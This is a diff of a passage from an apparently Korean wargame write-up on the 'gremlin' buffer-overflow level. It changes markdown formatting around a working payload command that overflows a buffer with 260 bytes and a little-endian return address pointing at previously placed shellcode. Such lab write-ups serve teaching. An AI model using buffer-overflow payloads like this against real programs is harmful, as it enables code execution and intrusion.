@@ -42,7 +42,7 @@ buffer에서 ebp까지의 거리가 256이라는 것이다.<br>
 25byte 쉘코드를 등록해준 후 주소값을 얻는 코드를 통해 주소값을 얻자.<br>
 
 **이제 페이로드를 작성해보자.**<br>
-```../gremlin `python -c 'print "A"*260+"\x25\xfd\xff\xbf"'````<br>
+```../gremlin `python -c 'print "A"*260+"\x25\xfd\xff\xbf"'` ```<br>
 *(주소는 little endian 방식으로 입력된다)*<br>
 <br>
 **공격 실시!**<br>
